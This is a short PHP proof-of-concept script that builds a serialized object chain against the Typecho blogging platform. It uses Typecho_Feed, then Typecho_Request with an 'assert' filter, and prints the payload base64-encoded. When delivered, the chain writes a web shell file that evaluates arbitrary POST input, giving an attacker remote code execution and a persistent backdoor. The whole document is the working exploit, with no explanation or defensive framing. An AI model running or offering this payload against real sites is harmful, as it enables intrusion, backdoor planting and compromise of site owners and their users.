<?php
class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    private $_type;
    private $_items;
	private $_charset;
	
    public function __construct(){
        $this->_type = $this::RSS2;
        $this->_items[0] = array(
            'author' => new Typecho_Request(),
        );
    }
}
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();
    public function __construct(){
        $this->_params['screenName'] = "file_put_contents('pupiles.php', '<?php @eval(\$_POST[xdsec]); ?>')";
        $this->_filter[0] = 'assert';
    }
}
$exp = array(
    'adapter' => new Typecho_Feed(),
    'prefix' => '_pupiles'
);
echo base64_encode(serialize($exp));